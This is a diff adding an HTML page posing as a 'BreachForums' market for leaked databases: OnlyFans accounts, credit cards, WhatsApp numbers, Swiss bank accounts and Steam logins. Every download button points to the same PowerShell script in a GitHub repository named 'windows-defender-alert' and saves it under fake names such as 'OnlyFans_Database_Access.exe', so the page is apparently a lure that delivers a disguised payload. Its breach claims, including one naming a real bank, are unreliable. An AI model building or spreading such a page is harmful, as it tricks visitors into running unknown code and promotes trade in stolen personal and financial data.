@@ -1,0 +1,110 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BreachForums — Database Access</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#c0c0c0;font-family:'Segoe UI',monospace;min-height:100vh}
+.topbar{background:#111;border-bottom:2px solid #333;padding:12px 20px;display:flex;justify-content:space-between;align-items:center}
+.topbar .logo{color:#00ff88;font-weight:700;font-size:16px}
+.topbar .stats{color:#666;font-size:11px}
+.container{max-width:700px;margin:30px auto;padding:0 20px}
+.db-card{background:#111;border:1px solid #222;border-radius:8px;overflow:hidden;margin-bottom:20px}
+.db-card:hover{border-color:#00ff88}
+.db-header{background:#1a1a1a;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #222}
+.db-header h3{color:#fff;font-size:15px}
+.db-badge{padding:4px 10px;border-radius:4px;font-size:10px;font-weight:700;text-transform:uppercase}
+.db-badge.new{background:#00ff88;color:#000}
+.db-badge.hot{background:#ff4444;color:#fff}
+.db-badge.premium{background:#ffaa00;color:#000}
+.db-body{padding:20px}
+.db-body table{width:100%;font-size:12px}
+.db-body td{padding:4px 8px;border-bottom:1px solid #1a1a1a}
+.db-body td:first-child{color:#666}
+.db-body td:last-child{color:#fff}
+.preview{background:#000;border:1px solid #222;border-radius:4px;padding:10px;font-family:'Consolas',monospace;font-size:11px;color:#00ff88;max-height:120px;overflow:hidden;margin:10px 0}
+.btn{display:block;width:100%;padding:14px;margin-top:14px;border:none;border-radius:6px;font-size:14px;font-weight:700;cursor:pointer;text-decoration:none;text-align:center}
+.btn-dl{background:#00ff88;color:#000}
+.btn-dl:hover{background:#00cc66}
+.btn-tor{background:#333;color:#ccc}
+.footer{text-align:center;padding:30px;color:#444;font-size:11px}
+.leak{display:inline-block;background:#ff4444;color:#fff;padding:2px 6px;border-radius:3px;font-size:9px;font-weight:700;margin-left:6px;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+</style></head><body>
+
+<div class="topbar">
+<div class="logo">⬡ BreachForums <span style="color:#666">— Database Market</span></div>
+<div class="stats">🔒 SSL &bull; Tor Mirror Online &bull; 12,847 Members</div>
+</div>
+
+<div class="container">
+
+<div class="db-card" style="border-color:#ff4444">
+<div class="db-header">
+<h3>🔴 OnlyFans — 847,000 Accounts <span class="leak">NEW</span></h3>
+<span class="db-badge hot">HOT</span></div>
+<div class="db-body">
+<table>
+<tr><td>Source</td><td>OnlyFans.com — Production Database</td></tr>
+<tr><td>Records</td><td>847,231 accounts</td></tr>
+<tr><td>Data</td><td>Email, Username, Password (bcrypt), Full Name, Country, Subscription History, Private Messages</td></tr>
+<tr><td>Date</td><td>July 2026 (2 days ago)</td></tr>
+<tr><td>Format</td><td>SQL Dump + CSV Export</td></tr>
+<tr><td>Size</td><td>4.7 GB compressed</td></tr>
+</table>
+<div class="preview">
+root@db-prod:~# mysqldump onlyfans users subscriptions messages > of_dump.sql<br>
+Dumping 847,231 rows...<br>
+users.sql — 2.1 GB<br>
+subscriptions.sql — 1.8 GB<br>
+messages.sql — 800 MB<br>
+</div>
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/fx.ps1" class="btn btn-dl" download="OnlyFans_Database_Access.exe">⬇️ DOWNLOAD DATABASE (4.7 GB)</a>
+<a href="#" class="btn btn-tor">🧅 Download via Tor Mirror</a>
+</div></div>
+
+<div class="db-card">
+<div class="db-header"><h3>💰 Credit Cards — 1.2M Cards (2026)</h3><span class="db-badge premium">PREMIUM</span></div>
+<div class="db-body">
+<table>
+<tr><td>Source</td><td>Payment Processor Breach</td></tr>
+<tr><td>Records</td><td>1,247,892 credit cards</td></tr>
+<tr><td>Data</td><td>Card Number, Expiry, CVV, Cardholder Name, Billing Address, Phone</td></tr>
+<tr><td>Valid Rate</td><td>74% (verified)</td></tr>
+</table>
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/fx.ps1" class="btn btn-dl" download="CreditCards_2026.exe">⬇️ DOWNLOAD CARD DATABASE</a>
+</div></div>
+
+<div class="db-card">
+<div class="db-header"><h3>📱 WhatsApp — 2.1B Phone Numbers</h3><span class="db-badge new">VERIFIED</span></div>
+<div class="db-body">
+<table>
+<tr><td>Source</td><td>Meta Datacenter Leak</td></tr>
+<tr><td>Records</td><td>2,187,000,000 phone numbers</td></tr>
+<tr><td>Data</td><td>Phone, Country, Last Seen, Profile Picture URL, Status</td></tr>
+</table>
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/fx.ps1" class="btn btn-dl" download="WhatsApp_Database.exe">⬇️ DOWNLOAD PHONE DATABASE</a>
+</div></div>
+
+<div class="db-card">
+<div class="db-header"><h3>🏦 Swiss Bank — 120K Accounts</h3><span class="db-badge hot">LEAKED</span></div>
+<div class="db-body">
+<table>
+<tr><td>Source</td><td>Banque Pictet & Cie SA — Internal Server</td></tr>
+<tr><td>Records</td><td>120,847 accounts</td></tr>
+<tr><td>Data</td><td>Account Number, Balance, Owner Name, Nationality, Transactions (2020-2026)</td></tr>
+</table>
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/fx.ps1" class="btn btn-dl" download="SwissBank_Leak.exe">⬇️ DOWNLOAD BANK DATABASE</a>
+</div></div>
+
+<div class="db-card">
+<div class="db-header"><h3>🎮 Steam — 45M Accounts (Inventory + Skins)</h3><span class="db-badge">FRESH</span></div>
+<div class="db-body">
+<table>
+<tr><td>Records</td><td>45,000,000+ Steam accounts</td></tr>
+<tr><td>Data</td><td>Login, Encrypted Pass, Email, Inventory Value, Trade History, Wallet Balance</td></tr>
+</table>
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/fx.ps1" class="btn btn-dl" download="Steam_Database.exe">⬇️ DOWNLOAD STEAM DATABASE</a>
+</div></div>
+
+</div>
+
+<div class="footer">BreachForums &copy; 2026 — Database Market — Tor Mirror: breachdatabf4x7onion.onion</div>
+
+</body></html>
